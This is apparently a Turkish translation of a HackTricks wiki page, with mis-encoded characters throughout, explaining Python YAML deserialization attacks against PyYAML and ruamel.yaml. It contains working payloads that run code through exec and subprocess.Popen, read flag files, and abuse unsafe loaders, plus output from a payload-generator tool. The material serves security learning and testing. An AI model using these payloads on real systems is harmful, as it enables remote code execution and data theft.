# Python Yaml SerileÅŸtirme

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi**]'ni(https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'ler**]'imizi(https://opensea.io/collection/the-peass-family) iÃ§eren koleksiyonumuzu
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na.

</details>

## Yaml **SerileÅŸtirme**

**Yaml** python kÃ¼tÃ¼phaneleri sadece ham verileri deÄŸil aynÄ± zamanda **python nesnelerini serileÅŸtirmek** iÃ§in de yeteneklidir:
```
print(yaml.dump(str("lol")))
lol
...

print(yaml.dump(tuple("lol")))
!!python/tuple
- l
- o
- l

print(yaml.dump(range(1,10)))
!!python/object/apply:builtins.range
- 1
- 10
- 1
```
**Demet**'in ham veri tÃ¼rÃ¼ olmadÄ±ÄŸÄ±nÄ± ve bu nedenle **serileÅŸtirilmiÅŸ** olduÄŸunu kontrol edin. Ve aynÄ± ÅŸey **range** ile de oldu (builtins'ten alÄ±ndÄ±).

![](<../../.gitbook/assets/image (1037).png>)

**safe\_load()** veya **safe\_load\_all()**, SafeLoader'Ä± kullanÄ±r ve **sÄ±nÄ±f nesnesi deserializasyonunu desteklemez**. SÄ±nÄ±f nesnesi deserializasyonu Ã¶rneÄŸi:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:builtins.range [1, 10, 1]'

print(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)
print(yaml.load(data, Loader=Loader)) #range(1, 10)
print(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=UnsafeLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load(data)) #range(1, 10)
print(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>

#The other ways to load data will through an error as they won't even attempt to
#deserialize the python object
```
Ã–nceki kod, serileÅŸtirilmiÅŸ python sÄ±nÄ±fÄ±nÄ± yÃ¼klemek iÃ§in **unsafe\_load** kullandÄ±. Bu, **sÃ¼rÃ¼m >= 5.1**'de, Loader belirtilmeyen veya Loader=SafeLoader olarak belirtilmeyen herhangi bir serileÅŸtirilmiÅŸ python sÄ±nÄ±fÄ±nÄ± veya sÄ±nÄ±f Ã¶zelliÄŸini **deserialize etmeyi** engellediÄŸi iÃ§in yapÄ±ldÄ±.

### Temel SÄ±zma

**Uyku iÅŸlemini nasÄ±l yÃ¼rÃ¼teceÄŸine** dair bir Ã¶rnek:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:time.sleep [2]'
print(yaml.load(data, Loader=UnsafeLoader)) #Executed
print(yaml.load(data, Loader=Loader)) #Executed
print(yaml.load_all(data))
print(yaml.load_all(data, Loader=Loader))
print(yaml.load_all(data, Loader=UnsafeLoader))
print(yaml.load_all(data, Loader=FullLoader))
print(yaml.unsafe_load(data)) #Executed
print(yaml.full_load_all(data))
print(yaml.unsafe_load_all(data))
```
### Loader Belirtilmeden .load("\<iÃ§erik>") ile GÃ¼venlik AÃ§Ä±ÄŸÄ±

Eski sÃ¼rÃ¼mlerinde pyyaml, bir ÅŸey yÃ¼klerken Loader belirtmediyseniz deserializasyon saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±zdÄ±: `yaml.load(data)`

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n [aÃ§Ä±klamasÄ±nÄ± burada](https://hackmd.io/@defund/HJZajCVlP) bulabilirsiniz. SÃ¶z konusu sayfadaki Ã¶nerilen **saldÄ±rÄ±** ise:
```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
state:
update: !!python/name:exec
```
Ya da bu **@ishaack tarafÄ±ndan saÄŸlanan tek satÄ±rlÄ±k kodu kullanabilirsiniz**:
```yaml
!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
```
**Son sÃ¼rÃ¼mlerde** artÄ±k `.load()` **Ã§agrÄ±sÄ± yapamazsÄ±nÄ±z** ve **`Loader` olmadan** **`FullLoader`** bu saldÄ±rÄ±ya **artÄ±k duyarlÄ± deÄŸil**.

## Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

Ã–zel yÃ¼kler, **PyYAML** veya **ruamel.yaml** gibi Python YAML modÃ¼lleri kullanÄ±larak oluÅŸturulabilir. Bu yÃ¼kler, gÃ¼vensiz girdileri doÄŸru ÅŸekilde temizlemeden ayrÄ±ÅŸtÄ±ran sistemlerdeki zafiyetleri sÃ¶mÃ¼rebilir.
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
def __reduce__(self):
return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
```
### YÃ¼k OluÅŸturmak iÃ§in AraÃ§

AraÃ§ [https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) Python deserializasyon saldÄ±rÄ± yÃ¼klerini oluÅŸturmak iÃ§in kullanÄ±labilir. **Pickle, PyYAML, jsonpickle ve ruamel.yaml**'Ä± kÃ¶tÃ¼ye kullanmak iÃ§in kullanÄ±labilir.
```bash
python3 peas.py
Enter RCE command :cat /root/flag.txt
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/example
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :All
Done Saving file !!!!

cat /tmp/example_jspick
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}

cat /tmp/example_pick | base64 -w0
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwOL3Jvb3QvZmxhZy50eHSUhpSFlFKULg==

cat /tmp/example_yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
- cat
- /root/flag.txt
```
### Referanslar

* [https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
* [https://net-square.com/yaml-deserialization-attack-in-python.html](https://net-square.com/yaml-deserialization-attack-in-python.html)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olana kadar AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
